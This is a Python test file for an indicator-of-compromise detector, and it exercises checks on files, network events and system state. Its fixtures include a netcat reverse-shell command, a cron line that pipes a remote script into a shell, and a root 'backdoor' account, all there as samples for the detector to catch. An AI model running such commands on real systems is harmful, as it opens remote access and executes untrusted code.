from src.analyzers.ioc_detector import IOCDetector, check_file_iocs, check_network_iocs, check_system_iocs

def test_file_iocs():
    hashes = {"md5": "44d88612fea8a8f36de82e1278abb02f"}
    iocs = check_file_iocs("/tmp/malware.pdf.exe", hashes)
    assert len(iocs) >= 2
    types = [i.type for i in iocs]
    assert "Hash" in types
    assert "File" in types

def test_network_iocs():
    events = [
        {"event": "FAILED SSH LOGIN", "ip": "192.168.1.105"},
        {"event": "FAILED SSH LOGIN", "ip": "192.168.1.105"},
    ]
    urls = ["https://suspicious-site.com/exploit"]
    iocs = check_network_iocs(events, urls)
    assert len(iocs) == 2
    assert iocs[0].type == "IP"
    assert iocs[0].value == "192.168.1.105"
    assert iocs[0].risk == "HIGH"

def test_system_iocs():
    processes = [{"pid": 1337, "cmdline": "nc -e /bin/sh 1.2.3.4 4444"}]
    users = [{"username": "backdoor", "uid": 0}]
    cron = [{"entry": "* * * * * curl http://bad.site/sh | sh"}]
    iocs = check_system_iocs(processes, users, cron)
    assert len(iocs) == 3
    types = [i.type for i in iocs]
    assert "Process" in types
    assert "Account" in types
    assert "Persistence" in types

def test_ioc_detector_scan():
    detector = IOCDetector()
    results = detector.scan()
    assert len(results) > 0
    assert results[0].type == "IP"
    assert results[0].value == "192.168.1.105"
